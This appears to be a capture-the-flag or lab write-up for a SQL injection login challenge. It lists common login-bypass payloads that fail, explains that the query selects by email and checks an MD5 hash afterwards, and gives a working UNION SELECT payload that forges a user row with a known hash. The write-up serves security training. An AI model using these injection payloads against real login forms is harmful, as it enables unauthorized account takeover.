## Hard lever
### Mission
Login it

### Hint
- Email: minhdz@gmail.com
- Username: minhdz

### Approach
Watch the web!

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/23.png" width="666px">
</p>

*This is a website with login function*

I tried the login bypass cheatsheet for email and password but no success

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/26.png" width="666px">
</p>

```sql
minhdz@gmail.com'--
minhdz@gmail.com"--
minhdz@gmail.com'#
minhdz@gmail.com"#
minhdz@gmail.com' or '1'='1
minhdz@gmail.com' or "1"="1
minhdz@gmail.com" or '1'='1
minhdz@gmail.com" or "1"="1
minhdz@gmail.com'"--
minhdz@gmail.com"'--
...
```

*I will go to the source code to see the login function*

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/24.png" width="666px">
</p>

See that! Function query from email and not check password

Then function will check password and password hash md5

My idea is to use UNION SELECT to select a fake md5 password and import a password

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/25.png" width="666px">
</p>

See the user table structure, the value are id,username,email,password respectively

I created a payload with a fake password

`oke' UNION SELECT '0','minhdz','minhdz@gmail.com','202cb962ac59075b964b07152d234b70'--`

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/27.png" width="666px">
</p>

*Delete the type email to enter other types more easily*

`202cb962ac59075b964b07152d234b70` is hash md5 of `123` so i enter password is **123**

Id 0 not found, i try other ids

```sql
oke' UNION SELECT '1','minhdz','minhdz@gmail.com','202cb962ac59075b964b07152d234b70'--
oke' UNION SELECT '2','minhdz','minhdz@gmail.com','202cb962ac59075b964b07152d234b70'--
oke' UNION SELECT '3','minhdz','minhdz@gmail.com','202cb962ac59075b964b07152d234b70'--
```

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/28.png" width="666px">
</p>

Success!!

**The payload is `oke' UNION SELECT '3','minhdz','minhdz@gmail.com','202cb962ac59075b964b07152d234b70'--`**